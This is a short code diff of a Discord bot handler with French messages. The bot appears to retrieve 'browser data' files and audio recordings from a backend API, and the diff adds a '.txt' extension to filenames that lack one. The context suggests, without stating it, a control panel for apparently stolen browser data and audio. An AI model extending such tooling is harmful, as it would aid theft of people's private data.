@@ -72,7 +72,10 @@ client.on('interactionCreate', async interaction => {
         await handleFileResponse(interaction, endpoint, fileName, "Voici l'enregistrement audio :", 'audio');
 
     } else if (interaction.customId === "select_browserdata") {
-        const [browserDataId, filename] = interaction.values[0].split('_');
+        let [browserDataId, filename] = interaction.values[0].split('_');
+        if (!filename.includes('.')) {
+            filename += '.txt';
+        }
         const endpoint = `${API_BASE_URL}/browser/data/${browserDataId}`;
         await handleFileResponse(interaction, endpoint, filename, "Voici le contenu du fichier :", 'text');
 
